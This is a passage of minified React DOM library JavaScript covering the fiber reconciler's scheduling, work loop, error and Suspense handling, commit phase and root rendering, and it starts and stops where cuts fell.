Fi,Di=Math.ceil,Ui=ee.ReactCurrentDispatcher,zi=ee.ReactCurrentOwner,Hi=0,Bi=8,Wi=16,Vi=32,$i=0,Gi=1,Xi=2,Qi=3,Ki=4,Ji=5,Yi=Hi,Zi=null,ec=null,tc=0,nc=$i,ac=null,rc=1073741823,lc=1073741823,oc=null,ic=0,cc=!1,sc=0,uc=500,dc=null,mc=!1,pc=null,hc=null,gc=!1,fc=null,Ec=90,bc=null,vc=0,yc=null,kc=0;function wc(){return(Yi&(Wi|Vi))!==Hi?1073741821-(al()/10|0):0!==kc?kc:kc=1073741821-(al()/10|0)}function xc(e,t,n){if(t=t.mode,0===(2&t))return 1073741823;var a=rl();if(0===(4&t))return 99===a?1073741823:1073741822;if((Yi&Wi)!==Hi)return tc;if(null!==n)e=dl(e,0|n.timeoutMs||5e3,250);else switch(a){case 99:e=1073741823;break;case 98:e=dl(e,150,100);break;case 97:case 96:e=dl(e,5e3,250);break;case 95:e=2;break;default:throw Error(o(326))}return null!==Zi&&e===tc&&--e,e}function jc(e,t){if(50<vc)throw vc=0,yc=null,Error(o(185));if(e=Sc(e,t),null!==e){var n=rl();1073741823===t?(Yi&Bi)!==Hi&&(Yi&(Wi|Vi))===Hi?Tc(e):(Ac(e),Yi===Hi&&sl()):Ac(e),(4&Yi)===Hi||98!==n&&99!==n||(null===bc?bc=new Map([[e,t]]):(n=bc.get(e),(void 0===n||n>t)&&bc.set(e,t)))}}function Sc(e,t){e.expirationTime<t&&(e.expirationTime=t);var n=e.alternate;null!==n&&n.expirationTime<t&&(n.expirationTime=t);var a=e.return,r=null;if(null===a&&3===e.tag)r=e.stateNode;else for(;null!==a;){if(n=a.alternate,a.childExpirationTime<t&&(a.childExpirationTime=t),null!==n&&n.childExpirationTime<t&&(n.childExpirationTime=t),null===a.return&&3===a.tag){r=a.stateNode;break}a=a.return}return null!==r&&(Zi===r&&(Mc(t),nc===Ki&&ms(r,tc)),ps(r,t)),r}function Cc(e){var t=e.lastExpiredTime;if(0!==t)return t;if(t=e.firstPendingTime,!ds(e,t))return t;var n=e.lastPingedTime;return e=e.nextKnownPendingLevel,e=n>e?n:e,2>=e&&t!==e?0:e}function Ac(e){if(0!==e.lastExpiredTime)e.callbackExpirationTime=1073741823,e.callbackPriority=99,e.callbackNode=cl(Tc.bind(null,e));else{var t=Cc(e),n=e.callbackNode;if(0===t)null!==n&&(e.callbackNode=null,e.callbackExpirationTime=0,e.callbackPriority=90);else{var a=wc();if(1073741823===t?a=99:1===t||2===t?a=95:(a=10*(1073741821-t)-10*(1073741821-a),a=0>=a?99:250>=a?98:5250>=a?97:95),null!==n){var r=e.callbackPriority;if(e.callbackExpirationTime===t&&r>=a)return;n!==Kr&&zr(n)}e.callbackExpirationTime=t,e.callbackPriority=a,t=1073741823===t?cl(Tc.bind(null,e)):il(a,Lc.bind(null,e),{timeout:10*(1073741821-t)-al()}),e.callbackNode=t}}}function Lc(e,t){if(kc=0,t)return t=wc(),hs(e,t),Ac(e),null;var n=Cc(e);if(0!==n){if(t=e.callbackNode,(Yi&(Wi|Vi))!==Hi)throw Error(o(327));if($c(),e===Zi&&n===tc||Pc(e,n),null!==ec){var a=Yi;Yi|=Wi;var r=_c();do{try{Dc();break}catch(c){Rc(e,c)}}while(1);if(El(),Yi=a,Ui.current=r,nc===Gi)throw t=ac,Pc(e,n),ms(e,n),Ac(e),t;if(null===ec)switch(r=e.finishedWork=e.current.alternate,e.finishedExpirationTime=n,a=nc,Zi=null,a){case $i:case Gi:throw Error(o(345));case Xi:hs(e,2<n?2:n);break;case Qi:if(ms(e,n),a=e.lastSuspendedTime,n===a&&(e.nextKnownPendingLevel=Hc(r)),1073741823===rc&&(r=sc+uc-al(),10<r)){if(cc){var l=e.lastPingedTime;if(0===l||l>=n){e.lastPingedTime=n,Pc(e,n);break}}if(l=Cc(e),0!==l&&l!==n)break;if(0!==a&&a!==n){e.lastPingedTime=a;break}e.timeoutHandle=Pn(Bc.bind(null,e),r);break}Bc(e);break;case Ki:if(ms(e,n),a=e.lastSuspendedTime,n===a&&(e.nextKnownPendingLevel=Hc(r)),cc&&(r=e.lastPingedTime,0===r||r>=n)){e.lastPingedTime=n,Pc(e,n);break}if(r=Cc(e),0!==r&&r!==n)break;if(0!==a&&a!==n){e.lastPingedTime=a;break}if(1073741823!==lc?a=10*(1073741821-lc)-al():1073741823===rc?a=0:(a=10*(1073741821-rc)-5e3,r=al(),n=10*(1073741821-n)-r,a=r-a,0>a&&(a=0),a=(120>a?120:480>a?480:1080>a?1080:1920>a?1920:3e3>a?3e3:4320>a?4320:1960*Di(a/1960))-a,n<a&&(a=n)),10<a){e.timeoutHandle=Pn(Bc.bind(null,e),a);break}Bc(e);break;case Ji:if(1073741823!==rc&&null!==oc){l=rc;var i=oc;if(a=0|i.busyMinDurationMs,0>=a?a=0:(r=0|i.busyDelayMs,l=al()-(10*(1073741821-l)-(0|i.timeoutMs||5e3)),a=l<=r?0:r+a-l),10<a){ms(e,n),e.timeoutHandle=Pn(Bc.bind(null,e),a);break}}Bc(e);break;default:throw Error(o(329))}if(Ac(e),e.callbackNode===t)return Lc.bind(null,e)}}return null}function Tc(e){var t=e.lastExpiredTime;if(t=0!==t?t:1073741823,(Yi&(Wi|Vi))!==Hi)throw Error(o(327));if($c(),e===Zi&&t===tc||Pc(e,t),null!==ec){var n=Yi;Yi|=Wi;var a=_c();do{try{Fc();break}catch(r){Rc(e,r)}}while(1);if(El(),Yi=n,Ui.current=a,nc===Gi)throw n=ac,Pc(e,t),ms(e,t),Ac(e),n;if(null!==ec)throw Error(o(261));e.finishedWork=e.current.alternate,e.finishedExpirationTime=t,Zi=null,Bc(e),Ac(e)}return null}function Nc(){if(null!==bc){var e=bc;bc=null,e.forEach((function(e,t){hs(t,e),Ac(t)})),sl()}}function Oc(e,t){var n=Yi;Yi|=1;try{return e(t)}finally{Yi=n,Yi===Hi&&sl()}}function Ic(e,t){var n=Yi;Yi&=-2,Yi|=Bi;try{return e(t)}finally{Yi=n,Yi===Hi&&sl()}}function Pc(e,t){e.finishedWork=null,e.finishedExpirationTime=0;var n=e.timeoutHandle;if(-1!==n&&(e.timeoutHandle=-1,Rn(n)),null!==ec)for(n=ec.return;null!==n;){var a=n;switch(a.tag){case 1:a=a.type.childContextTypes,null!==a&&void 0!==a&&Rr();break;case 3:Kl(),Cr(Nr),Cr(Tr);break;case 5:Yl(a);break;case 4:Kl();break;case 13:Cr(Zl);break;case 19:Cr(Zl);break;case 10:bl(a)}n=n.return}Zi=e,ec=ls(e.current,null),tc=t,nc=$i,ac=null,lc=rc=1073741823,oc=null,ic=0,cc=!1}function Rc(e,t){do{try{if(El(),no.current=Ro,co)for(var n=lo.memoizedState;null!==n;){var a=n.queue;null!==a&&(a.pending=null),n=n.next}if(ro=0,io=oo=lo=null,co=!1,null===ec||null===ec.return)return nc=Gi,ac=t,ec=null;e:{var r=e,l=ec.return,o=ec,i=t;if(t=tc,o.effectTag|=2048,o.firstEffect=o.lastEffect=null,null!==i&&"object"===typeof i&&"function"===typeof i.then){var c=i;if(0===(2&o.mode)){var s=o.alternate;s?(o.updateQueue=s.updateQueue,o.memoizedState=s.memoizedState,o.expirationTime=s.expirationTime):(o.updateQueue=null,o.memoizedState=null)}var u=0!==(1&Zl.current),d=l;do{var m;if(m=13===d.tag){var p=d.memoizedState;if(null!==p)m=null!==p.dehydrated;else{var h=d.memoizedProps;m=void 0!==h.fallback&&(!0!==h.unstable_avoidThisFallback||!u)}}if(m){var g=d.updateQueue;if(null===g){var f=new Set;f.add(c),d.updateQueue=f}else g.add(c);if(0===(2&d.mode)){if(d.effectTag|=64,o.effectTag&=-2981,1===o.tag)if(null===o.alternate)o.tag=17;else{var E=Sl(1073741823,null);E.tag=2,Cl(o,E)}o.expirationTime=1073741823;break e}i=void 0,o=t;var b=r.pingCache;if(null===b?(b=r.pingCache=new _i,i=new Set,b.set(c,i)):(i=b.get(c),void 0===i&&(i=new Set,b.set(c,i))),!i.has(o)){i.add(o);var v=Kc.bind(null,r,c,o);c.then(v,v)}d.effectTag|=4096,d.expirationTime=t;break e}d=d.return}while(null!==d);i=Error((ke(o.type)||"A React component")+" suspended while rendering, but no fallback UI was specified.\n\nAdd a <Suspense fallback=...> component higher in the tree to provide a loading indicator or placeholder to display."+we(o))}nc!==Ji&&(nc=Xi),i=Ei(i,o),d=l;do{switch(d.tag){case 3:c=i,d.effectTag|=4096,d.expirationTime=t;var y=qi(d,c,t);Al(d,y);break e;case 1:c=i;var k=d.type,w=d.stateNode;if(0===(64&d.effectTag)&&("function"===typeof k.getDerivedStateFromError||null!==w&&"function"===typeof w.componentDidCatch&&(null===hc||!hc.has(w)))){d.effectTag|=4096,d.expirationTime=t;var x=Mi(d,c,t);Al(d,x);break e}}d=d.return}while(null!==d)}ec=zc(ec)}catch(j){t=j;continue}break}while(1)}function _c(){var e=Ui.current;return Ui.current=Ro,null===e?Ro:e}function qc(e,t){e<rc&&2<e&&(rc=e),null!==t&&e<lc&&2<e&&(lc=e,oc=t)}function Mc(e){e>ic&&(ic=e)}function Fc(){for(;null!==ec;)ec=Uc(ec)}function Dc(){for(;null!==ec&&!Jr();)ec=Uc(ec)}function Uc(e){var t=Fi(e.alternate,e,tc);return e.memoizedProps=e.pendingProps,null===t&&(t=zc(e)),zi.current=null,t}function zc(e){ec=e;do{var t=ec.alternate;if(e=ec.return,0===(2048&ec.effectTag)){if(t=gi(t,ec,tc),1===tc||1!==ec.childExpirationTime){for(var n=0,a=ec.child;null!==a;){var r=a.expirationTime,l=a.childExpirationTime;r>n&&(n=r),l>n&&(n=l),a=a.sibling}ec.childExpirationTime=n}if(null!==t)return t;null!==e&&0===(2048&e.effectTag)&&(null===e.firstEffect&&(e.firstEffect=ec.firstEffect),null!==ec.lastEffect&&(null!==e.lastEffect&&(e.lastEffect.nextEffect=ec.firstEffect),e.lastEffect=ec.lastEffect),1<ec.effectTag&&(null!==e.lastEffect?e.lastEffect.nextEffect=ec:e.firstEffect=ec,e.lastEffect=ec))}else{if(t=fi(ec),null!==t)return t.effectTag&=2047,t;null!==e&&(e.firstEffect=e.lastEffect=null,e.effectTag|=2048)}if(t=ec.sibling,null!==t)return t;ec=e}while(null!==ec);return nc===$i&&(nc=Ji),null}function Hc(e){var t=e.expirationTime;return e=e.childExpirationTime,t>e?t:e}function Bc(e){var t=rl();return ol(99,Wc.bind(null,e,t)),null}function Wc(e,t){do{$c()}while(null!==fc);if((Yi&(Wi|Vi))!==Hi)throw Error(o(327));var n=e.finishedWork,a=e.finishedExpirationTime;if(null===n)return null;if(e.finishedWork=null,e.finishedExpirationTime=0,n===e.current)throw Error(o(177));e.callbackNode=null,e.callbackExpirationTime=0,e.callbackPriority=90,e.nextKnownPendingLevel=0;var r=Hc(n);if(e.firstPendingTime=r,a<=e.lastSuspendedTime?e.firstSuspendedTime=e.lastSuspendedTime=e.nextKnownPendingLevel=0:a<=e.firstSuspendedTime&&(e.firstSuspendedTime=a-1),a<=e.lastPingedTime&&(e.lastPingedTime=0),a<=e.lastExpiredTime&&(e.lastExpiredTime=0),e===Zi&&(ec=Zi=null,tc=0),1<n.effectTag?null!==n.lastEffect?(n.lastEffect.nextEffect=n,r=n.firstEffect):r=n:r=n.firstEffect,null!==r){var l=Yi;Yi|=Vi,zi.current=null,Tn=tn;var i=xn();if(jn(i)){if("selectionStart"in i)var c={start:i.selectionStart,end:i.selectionEnd};else e:{c=(c=i.ownerDocument)&&c.defaultView||window;var s=c.getSelection&&c.getSelection();if(s&&0!==s.rangeCount){c=s.anchorNode;var u=s.anchorOffset,d=s.focusNode;s=s.focusOffset;try{c.nodeType,d.nodeType}catch(C){c=null;break e}var m=0,p=-1,h=-1,g=0,f=0,E=i,b=null;t:for(;;){for(var v;;){if(E!==c||0!==u&&3!==E.nodeType||(p=m+u),E!==d||0!==s&&3!==E.nodeType||(h=m+s),3===E.nodeType&&(m+=E.nodeValue.length),null===(v=E.firstChild))break;b=E,E=v}for(;;){if(E===i)break t;if(b===c&&++g===u&&(p=m),b===d&&++f===s&&(h=m),null!==(v=E.nextSibling))break;E=b,b=E.parentNode}E=v}c=-1===p||-1===h?null:{start:p,end:h}}else c=null}c=c||{start:0,end:0}}else c=null;Nn={activeElementDetached:null,focusedElem:i,selectionRange:c},tn=!1,dc=r;do{try{Vc()}catch(C){if(null===dc)throw Error(o(330));Qc(dc,C),dc=dc.nextEffect}}while(null!==dc);dc=r;do{try{for(i=e,c=t;null!==dc;){var y=dc.effectTag;if(16&y&&$e(dc.stateNode,""),128&y){var k=dc.alternate;if(null!==k){var w=k.ref;null!==w&&("function"===typeof w?w(null):w.current=null)}}switch(1038&y){case 2:Ti(dc),dc.effectTag&=-3;break;case 6:Ti(dc),dc.effectTag&=-3,Pi(dc.alternate,dc);break;case 1024:dc.effectTag&=-1025;break;case 1028:dc.effectTag&=-1025,Pi(dc.alternate,dc);break;case 4:Pi(dc.alternate,dc);break;case 8:u=dc,Ii(i,u,c),Ai(u)}dc=dc.nextEffect}}catch(C){if(null===dc)throw Error(o(330));Qc(dc,C),dc=dc.nextEffect}}while(null!==dc);if(w=Nn,k=xn(),y=w.focusedElem,c=w.selectionRange,k!==y&&y&&y.ownerDocument&&wn(y.ownerDocument.documentElement,y)){null!==c&&jn(y)&&(k=c.start,w=c.end,void 0===w&&(w=k),"selectionStart"in y?(y.selectionStart=k,y.selectionEnd=Math.min(w,y.value.length)):(w=(k=y.ownerDocument||document)&&k.defaultView||window,w.getSelection&&(w=w.getSelection(),u=y.textContent.length,i=Math.min(c.start,u),c=void 0===c.end?i:Math.min(c.end,u),!w.extend&&i>c&&(u=c,c=i,i=u),u=kn(y,i),d=kn(y,c),u&&d&&(1!==w.rangeCount||w.anchorNode!==u.node||w.anchorOffset!==u.offset||w.focusNode!==d.node||w.focusOffset!==d.offset)&&(k=k.createRange(),k.setStart(u.node,u.offset),w.removeAllRanges(),i>c?(w.addRange(k),w.extend(d.node,d.offset)):(k.setEnd(d.node,d.offset),w.addRange(k)))))),k=[];for(w=y;w=w.parentNode;)1===w.nodeType&&k.push({element:w,left:w.scrollLeft,top:w.scrollTop});for("function"===typeof y.focus&&y.focus(),y=0;y<k.length;y++)w=k[y],w.element.scrollLeft=w.left,w.element.scrollTop=w.top}tn=!!Tn,Nn=Tn=null,e.current=n,dc=r;do{try{for(y=e;null!==dc;){var x=dc.effectTag;if(36&x&&Si(y,dc.alternate,dc),128&x){k=void 0;var j=dc.ref;if(null!==j){var S=dc.stateNode;switch(dc.tag){case 5:k=S;break;default:k=S}"function"===typeof j?j(k):j.current=k}}dc=dc.nextEffect}}catch(C){if(null===dc)throw Error(o(330));Qc(dc,C),dc=dc.nextEffect}}while(null!==dc);dc=null,Yr(),Yi=l}else e.current=n;if(gc)gc=!1,fc=e,Ec=t;else for(dc=r;null!==dc;)t=dc.nextEffect,dc.nextEffect=null,dc=t;if(t=e.firstPendingTime,0===t&&(hc=null),1073741823===t?e===yc?vc++:(vc=0,yc=e):vc=0,"function"===typeof Yc&&Yc(n.stateNode,a),Ac(e),mc)throw mc=!1,e=pc,pc=null,e;return(Yi&Bi)!==Hi||sl(),null}function Vc(){for(;null!==dc;){var e=dc.effectTag;0!==(256&e)&&wi(dc.alternate,dc),0===(512&e)||gc||(gc=!0,il(97,(function(){return $c(),null}))),dc=dc.nextEffect}}function $c(){if(90!==Ec){var e=97<Ec?97:Ec;return Ec=90,ol(e,Gc)}}function Gc(){if(null===fc)return!1;var e=fc;if(fc=null,(Yi&(Wi|Vi))!==Hi)throw Error(o(331));var t=Yi;for(Yi|=Vi,e=e.current.firstEffect;null!==e;){try{var n=e;if(0!==(512&n.effectTag))switch(n.tag){case 0:case 11:case 15:case 22:xi(5,n),ji(5,n)}}catch(a){if(null===e)throw Error(o(330));Qc(e,a)}n=e.nextEffect,e.nextEffect=null,e=n}return Yi=t,sl(),!0}function Xc(e,t,n){t=Ei(n,t),t=qi(e,t,1073741823),Cl(e,t),e=Sc(e,1073741823),null!==e&&Ac(e)}function Qc(e,t){if(3===e.tag)Xc(e,e,t);else for(var n=e.return;null!==n;){if(3===n.tag){Xc(n,e,t);break}if(1===n.tag){var a=n.stateNode;if("function"===typeof n.type.getDerivedStateFromError||"function"===typeof a.componentDidCatch&&(null===hc||!hc.has(a))){e=Ei(t,e),e=Mi(n,e,1073741823),Cl(n,e),n=Sc(n,1073741823),null!==n&&Ac(n);break}}n=n.return}}function Kc(e,t,n){var a=e.pingCache;null!==a&&a.delete(t),Zi===e&&tc===n?nc===Ki||nc===Qi&&1073741823===rc&&al()-sc<uc?Pc(e,tc):cc=!0:ds(e,n)&&(t=e.lastPingedTime,0!==t&&t<n||(e.lastPingedTime=n,Ac(e)))}function Jc(e,t){var n=e.stateNode;null!==n&&n.delete(t),t=0,0===t&&(t=wc(),t=xc(t,e,null)),e=Sc(e,t),null!==e&&Ac(e)}Fi=function(e,t,n){var a=t.expirationTime;if(null!==e){var r=t.pendingProps;if(e.memoizedProps!==r||Nr.current)Xo=!0;else{if(a<n){switch(Xo=!1,t.tag){case 3:ai(t),$o();break;case 5:if(Jl(t),4&t.mode&&1!==n&&r.hidden)return t.expirationTime=t.childExpirationTime=1,null;break;case 1:Pr(t.type)&&Mr(t);break;case 4:Ql(t,t.stateNode.containerInfo);break;case 10:a=t.memoizedProps.value,r=t.type._context,Ar(pl,r._currentValue),r._currentValue=a;break;case 13:if(null!==t.memoizedState)return a=t.child.childExpirationTime,0!==a&&a>=n?si(e,t,n):(Ar(Zl,1&Zl.current),t=pi(e,t,n),null!==t?t.sibling:null);Ar(Zl,1&Zl.current);break;case 19:if(a=t.childExpirationTime>=n,0!==(64&e.effectTag)){if(a)return mi(e,t,n);t.effectTag|=64}if(r=t.memoizedState,null!==r&&(r.rendering=null,r.tail=null),Ar(Zl,Zl.current),!a)return null}return pi(e,t,n)}Xo=!1}}else Xo=!1;switch(t.expirationTime=0,t.tag){case 2:if(a=t.type,null!==e&&(e.alternate=null,t.alternate=null,t.effectTag|=2),e=t.pendingProps,r=Ir(t,Tr.current),yl(t,n),r=mo(null,t,a,e,r,n),t.effectTag|=1,"object"===typeof r&&null!==r&&"function"===typeof r.render&&void 0===r.$$typeof){if(t.tag=1,t.memoizedState=null,t.updateQueue=null,Pr(a)){var l=!0;Mr(t)}else l=!1;t.memoizedState=null!==r.state&&void 0!==r.state?r.state:null,xl(t);var i=a.getDerivedStateFromProps;"function"===typeof i&&Il(t,a,i,e),r.updater=Pl,t.stateNode=r,r._reactInternalFiber=t,Ml(t,a,e,n),t=ni(null,t,a,!0,l,n)}else t.tag=0,Qo(null,t,r,n),t=t.child;return t;case 16:e:{if(r=t.elementType,null!==e&&(e.alternate=null,t.alternate=null,t.effectTag|=2),e=t.pendingProps,ye(r),1!==r._status)throw r._result;switch(r=r._result,t.type=r,l=t.tag=rs(r),e=ml(r,e),l){case 0:t=ei(null,t,r,e,n);break e;case 1:t=ti(null,t,r,e,n);break e;case 11:t=Ko(null,t,r,e,n);break e;case 14:t=Jo(null,t,r,ml(r.type,e),a,n);break e}throw Error(o(306,r,""))}return t;case 0:return a=t.type,r=t.pendingProps,r=t.elementType===a?r:ml(a,r),ei(e,t,a,r,n);case 1:return a=t.type,r=t.pendingProps,r=t.elementType===a?r:ml(a,r),ti(e,t,a,r,n);case 3:if(ai(t),a=t.updateQueue,null===e||null===a)throw Error(o(282));if(a=t.pendingProps,r=t.memoizedState,r=null!==r?r.element:null,jl(e,t),Ll(t,a,null,n),a=t.memoizedState.element,a===r)$o(),t=pi(e,t,n);else{if((r=t.stateNode.hydrate)&&(Do=_n(t.stateNode.containerInfo.firstChild),Fo=t,r=Uo=!0),r)for(n=Bl(t,null,a,n),t.child=n;n;)n.effectTag=-3&n.effectTag|1024,n=n.sibling;else Qo(e,t,a,n),$o();t=t.child}return t;case 5:return Jl(t),null===e&&Bo(t),a=t.type,r=t.pendingProps,l=null!==e?e.memoizedProps:null,i=r.children,In(a,r)?i=null:null!==l&&In(a,l)&&(t.effectTag|=16),Zo(e,t),4&t.mode&&1!==n&&r.hidden?(t.expirationTime=t.childExpirationTime=1,t=null):(Qo(e,t,i,n),t=t.child),t;case 6:return null===e&&Bo(t),null;case 13:return si(e,t,n);case 4:return Ql(t,t.stateNode.containerInfo),a=t.pendingProps,null===e?t.child=Hl(t,null,a,n):Qo(e,t,a,n),t.child;case 11:return a=t.type,r=t.pendingProps,r=t.elementType===a?r:ml(a,r),Ko(e,t,a,r,n);case 7:return Qo(e,t,t.pendingProps,n),t.child;case 8:return Qo(e,t,t.pendingProps.children,n),t.child;case 12:return Qo(e,t,t.pendingProps.children,n),t.child;case 10:e:{a=t.type._context,r=t.pendingProps,i=t.memoizedProps,l=r.value;var c=t.type._context;if(Ar(pl,c._currentValue),c._currentValue=l,null!==i)if(c=i.value,l=er(c,l)?0:0|("function"===typeof a._calculateChangedBits?a._calculateChangedBits(c,l):1073741823),0===l){if(i.children===r.children&&!Nr.current){t=pi(e,t,n);break e}}else for(c=t.child,null!==c&&(c.return=t);null!==c;){var s=c.dependencies;if(null!==s){i=c.child;for(var u=s.firstContext;null!==u;){if(u.context===a&&0!==(u.observedBits&l)){1===c.tag&&(u=Sl(n,null),u.tag=2,Cl(c,u)),c.expirationTime<n&&(c.expirationTime=n),u=c.alternate,null!==u&&u.expirationTime<n&&(u.expirationTime=n),vl(c.return,n),s.expirationTime<n&&(s.expirationTime=n);break}u=u.next}}else i=10===c.tag&&c.type===t.type?null:c.child;if(null!==i)i.return=c;else for(i=c;null!==i;){if(i===t){i=null;break}if(c=i.sibling,null!==c){c.return=i.return,i=c;break}i=i.return}c=i}Qo(e,t,r.children,n),t=t.child}return t;case 9:return r=t.type,l=t.pendingProps,a=l.children,yl(t,n),r=kl(r,l.unstable_observedBits),a=a(r),t.effectTag|=1,Qo(e,t,a,n),t.child;case 14:return r=t.type,l=ml(r,t.pendingProps),l=ml(r.type,l),Jo(e,t,r,l,a,n);case 15:return Yo(e,t,t.type,t.pendingProps,a,n);case 17:return a=t.type,r=t.pendingProps,r=t.elementType===a?r:ml(a,r),null!==e&&(e.alternate=null,t.alternate=null,t.effectTag|=2),t.tag=1,Pr(a)?(e=!0,Mr(t)):e=!1,yl(t,n),_l(t,a,r),Ml(t,a,r,n),ni(null,t,a,!0,e,n);case 19:return mi(e,t,n)}throw Error(o(156,t.tag))};var Yc=null,Zc=null;function es(e){if("undefined"===typeof __REACT_DEVTOOLS_GLOBAL_HOOK__)return!1;var t=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(t.isDisabled||!t.supportsFiber)return!0;try{var n=t.inject(e);Yc=function(e){try{t.onCommitFiberRoot(n,e,void 0,64===(64&e.current.effectTag))}catch(a){}},Zc=function(e){try{t.onCommitFiberUnmount(n,e)}catch(a){}}}catch(a){}return!0}function ts(e,t,n,a){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=a,this.effectTag=0,this.lastEffect=this.firstEffect=this.nextEffect=null,this.childExpirationTime=this.expirationTime=0,this.alternate=null}function ns(e,t,n,a){return new ts(e,t,n,a)}function as(e){return e=e.prototype,!(!e||!e.isReactComponent)}function rs(e){if("function"===typeof e)return as(e)?1:0;if(void 0!==e&&null!==e){if(e=e.$$typeof,e===me)return 11;if(e===ge)return 14}return 2}function ls(e,t){var n=e.alternate;return null===n?(n=ns(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.effectTag=0,n.nextEffect=null,n.firstEffect=null,n.lastEffect=null),n.childExpirationTime=e.childExpirationTime,n.expirationTime=e.expirationTime,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=null===t?null:{expirationTime:t.expirationTime,firstContext:t.firstContext,responders:t.responders},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function os(e,t,n,a,r,l){var i=2;if(a=e,"function"===typeof e)as(e)&&(i=1);else if("string"===typeof e)i=5;else e:switch(e){case oe:return is(n.children,r,l,t);case de:i=8,r|=7;break;case ie:i=8,r|=1;break;case ce:return e=ns(12,n,t,8|r),e.elementType=ce,e.type=ce,e.expirationTime=l,e;case pe:return e=ns(13,n,t,r),e.type=pe,e.elementType=pe,e.expirationTime=l,e;case he:return e=ns(19,n,t,r),e.elementType=he,e.expirationTime=l,e;default:if("object"===typeof e&&null!==e)switch(e.$$typeof){case se:i=10;break e;case ue:i=9;break e;case me:i=11;break e;case ge:i=14;break e;case fe:i=16,a=null;break e;case Ee:i=22;break e}throw Error(o(130,null==e?e:typeof e,""))}return t=ns(i,n,t,r),t.elementType=e,t.type=a,t.expirationTime=l,t}function is(e,t,n,a){return e=ns(7,e,a,t),e.expirationTime=n,e}function cs(e,t,n){return e=ns(6,e,null,t),e.expirationTime=n,e}function ss(e,t,n){return t=ns(4,null!==e.children?e.children:[],e.key,t),t.expirationTime=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function us(e,t,n){this.tag=t,this.current=null,this.containerInfo=e,this.pingCache=this.pendingChildren=null,this.finishedExpirationTime=0,this.finishedWork=null,this.timeoutHandle=-1,this.pendingContext=this.context=null,this.hydrate=n,this.callbackNode=null,this.callbackPriority=90,this.lastExpiredTime=this.lastPingedTime=this.nextKnownPendingLevel=this.lastSuspendedTime=this.firstSuspendedTime=this.firstPendingTime=0}function ds(e,t){var n=e.firstSuspendedTime;return e=e.lastSuspendedTime,0!==n&&n>=t&&e<=t}function ms(e,t){var n=e.firstSuspendedTime,a=e.lastSuspendedTime;n<t&&(e.firstSuspendedTime=t),(a>t||0===n)&&(e.lastSuspendedTime=t),t<=e.lastPingedTime&&(e.lastPingedTime=0),t<=e.lastExpiredTime&&(e.lastExpiredTime=0)}function ps(e,t){t>e.firstPendingTime&&(e.firstPendingTime=t);var n=e.firstSuspendedTime;0!==n&&(t>=n?e.firstSuspendedTime=e.lastSuspendedTime=e.nextKnownPendingLevel=0:t>=e.lastSuspendedTime&&(e.lastSuspendedTime=t+1),t>e.nextKnownPendingLevel&&(e.nextKnownPendingLevel=t))}function hs(e,t){var n=e.lastExpiredTime;(0===n||n>t)&&(e.lastExpiredTime=t)}function gs(e,t,n,a){var r=t.current,l=wc(),i=Nl.suspense;l=xc(l,r,i);e:if(n){n=n._reactInternalFiber;t:{if(lt(n)!==n||1!==n.tag)throw Error(o(170));var c=n;do{switch(c.tag){case 3:c=c.stateNode.context;break t;case 1:if(Pr(c.type)){c=c.stateNode.__reactInternalMemoizedMergedChildContext;break t}}c=c.return}while(null!==c);throw Error(o(171))}if(1===n.tag){var s=n.type;if(Pr(s)){n=qr(n,s,c);break e}}n=c}else n=Lr;return null===t.context?t.context=n:t.pendingContext=n,t=Sl(l,i),t.payload={element:e},a=void 0===a?null:a,null!==a&&(t.callback=a),Cl(r,t),jc(r,l),l}function fs(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Es(e,t){e=e.memoizedState,null!==e&&null!==e.dehydrated&&e.retryTime<t&&(e.retryTime=t)}function bs(e,t){Es(e,t),(e=e.alternate)&&Es(e,t)}function vs(e,t,n){n=null!=n&&!0===n.hydrate;var a=new us(e,t,n),r=ns(3,null,null,2===t?7:1===t?3:0);a.current=r,r.stateNode=a,xl(r),e[Un]=a.current,n&&0!==t&&_t(e,9===e.nodeType?e:e.ownerDocument),this._internalRoot=a}function ys(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType&&(8!==e.nodeType||" react-mount-point-unstable "!==e.nodeValue))}function ks(e,t){if(t||(t=e?9===e.nodeType?e.documentElement:e.firstChild:null,t=!(!t||1!==t.nodeType||!t.hasAttribute("data-reactroot"))),!t)for(var n;n=e.lastChild;)e.removeChild(n);return new vs(e,0,t?{hydrate:!0}:void 0)}function ws(e,t,n,a,r){var l=n._reactRootContainer;if(l){var o=l._internalRoot;if("function"===typeof r){var i=r;r=function(){var e=fs(o);i.call(e)}}gs(t,o,e,r)}else{if(l=n._reactRootContainer=ks(n,a),o=l._internalRoot,"function"===typeof r){var c=r;r=function(){var e=fs(o);c.call(e)}}Ic((function(){gs(t,o,e,r)}))}return fs(o)}function xs(e,t,n){var a=3<arguments.length&&void 0!==arguments[3]?arguments[3]:null;return{$$typeof:le,key:null==a?null:""+a,children:e,containerInfo:t,implementation:n}}function js(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:null;if(!ys(t))throw Error(o(200));return xs(e,t,null,n)}vs.prototype.render=function(e){gs(e,this._internalRoot,null,null)},vs.prototype.unmount=function(){var e=this._internalRoot,t=e.containerInfo;gs(null,e,null,(function(){t[Un]=null}))},wt=function(e){if(13===e.tag){var t=dl(wc(),150,100);jc(e,t),bs(e,t)}},xt=function(e){13===e.tag&&(jc(e,3),bs(e,3))},jt=function(e){if(13===e.tag){var t=wc();t=xc(t,e,null),jc(e,t),bs(e,t)}},T=function(e,t,n){switch(t){case"input":if(Oe(e,n),t=n.name,"radio"===n.type&&null!=t){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var a=n[t];if(a!==e&&a.form===e.form){var r=Wn(a);if(!r)throw 